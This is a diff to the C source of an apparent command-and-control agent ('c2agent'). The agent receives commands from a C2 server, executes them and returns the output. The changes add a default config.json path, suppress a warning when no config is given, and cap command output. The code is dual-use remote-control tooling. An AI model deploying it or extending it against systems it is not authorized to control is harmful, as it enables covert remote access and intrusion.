@@ -18,6 +18,7 @@ typedef struct {
 
 static void opts_init(opts *o) {
     memset(o, 0, sizeof *o);
+    o->config_path = xstrdup("config.json");
     o->heartbeat_interval = 30;
     o->cmd_timeout = 60;
     o->reconnect_initial = 1;
@@ -80,10 +81,10 @@ static int parse_c2_address(const char *addr, char **host, int *port) {
     return 0;
 }
 
-static void load_config_file(const char *path, opts *o) {
+static void load_config_file(const char *path, opts *o, int quiet) {
     FILE *f = c2a_fopen(path, "rb");
     if (!f) {
-        fprintf(stderr, "[c2agent] warning: cannot open config file: %s\n", path);
+        if (!quiet) fprintf(stderr, "[c2agent] warning: cannot open config file: %s\n", path);
         return;
     }
     fseek(f, 0, SEEK_END);
@@ -127,7 +128,7 @@ static void load_config_file(const char *path, opts *o) {
 
 static void print_usage(const char *prog) {
     printf("Usage: %s [options]\n", prog);
-    printf("  --config <path>            optional JSON config file\n");
+    printf("  --config <path>            JSON config file (default config.json)\n");
     printf("  --c2-address host:port      C2 address (required unless in config)\n");
     printf("  --agent-id <id>            unique agent id (required unless in config)\n");
     printf("  --auth-token <token>       pre-shared token (required unless in config)\n");
@@ -576,8 +577,10 @@ static int dispatch(sockfd_t sock, bytebuf_t *inbuf, const opts *o, int *shutdow
         }
         char *result = run_action(cmd, params, n, o->cmd_timeout);
         tlv_free(params, n);
-        send_response_pkt(sock, req_id, cmd, result, strlen(result));
+        char *capped = cap_output(result);
         free(result);
+        send_response_pkt(sock, req_id, cmd, capped, strlen(capped));
+        free(capped);
         return 0;
     }
     send_response_pkt(sock, req_id, cmd, "Error: Unknown cmd", strlen("Error: Unknown cmd"));
@@ -725,12 +728,16 @@ int main(int argc, char **argv) {
     opts_init(&o);
 
     /* config file first (provides defaults), then CLI overrides */
+    int cfg_explicit = 0;
+    const char *cfg_path = o.config_path;
     for (int i = 1; i < argc - 1; i++) {
         if (strcmp(argv[i], "--config") == 0) {
-            load_config_file(argv[i + 1], &o);
+            cfg_path = argv[i + 1];
+            cfg_explicit = 1;
             break;
         }
     }
+    load_config_file(cfg_path, &o, !cfg_explicit);
     int rc = parse_args(argc, argv, &o);
     if (rc == 1) {
         print_usage(argv[0]);
